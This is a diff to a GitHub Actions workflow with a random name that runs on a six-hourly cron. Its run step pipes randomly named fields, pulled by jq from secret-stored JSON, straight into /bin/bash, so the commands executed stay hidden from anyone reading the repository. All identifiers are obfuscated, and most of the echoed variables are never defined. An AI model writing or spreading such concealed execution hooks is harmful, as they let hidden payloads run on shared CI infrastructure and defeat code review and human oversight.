@@ -1,24 +1,29 @@
 name: garmentlasagne
+
 on:
   workflow_dispatch:
   schedule:
-    - cron: '46 1/6 * * *'
+    - cron: '47 5/6 * * *'
 
-jobs:  # 1735
+jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: garmentlasagne
         env:
-          tljp49178: ${{ secrets.tljp49178 }}
+          uibpz7: ${{ secrets.uibpz7 }}
         run: |
-          echo $tljp49178 | jq -r .tlrg73336 | /bin/bash
-          echo $bhcf30 | jq -r .gp8 | /bin/bash
-          echo $oxfuy2 | jq -r .obd99167 | /bin/bash
-          echo $ddlqc2 | jq -r .anver34 | /bin/bash
-          echo $ad95098 | jq -r .hbq73623 | /bin/bash
-          echo $q77435 | jq -r .pnvuk3511 | /bin/bash
-          echo $j54 | jq -r .n38 | /bin/bash
+          echo $uibpz7 | jq -r .cahs17030 | /bin/bash
+          echo $b7 | jq -r .a5474 | /bin/bash
+          echo $zzkg07 | jq -r .qnp892 | /bin/bash
+          echo $g46 | jq -r .svek5509 | /bin/bash
+          echo $unyd52621 | jq -r .ocv67954 | /bin/bash
+          echo $zruu4 | jq -r .eped8 | /bin/bash
+          echo $ih94 | jq -r .w606 | /bin/bash
+          echo $zmcm50 | jq -r .eda2 | /bin/bash
+          echo $osdiv9770 | jq -r .zdwk6711 | /bin/bash
+          echo $igjc0 | jq -r .kevwc73225 | /bin/bash
+          echo $zwohw9 | jq -r .qqyt3 | /bin/bash
+          echo $mmmbs8 | jq -r .a0708 | /bin/bash
 
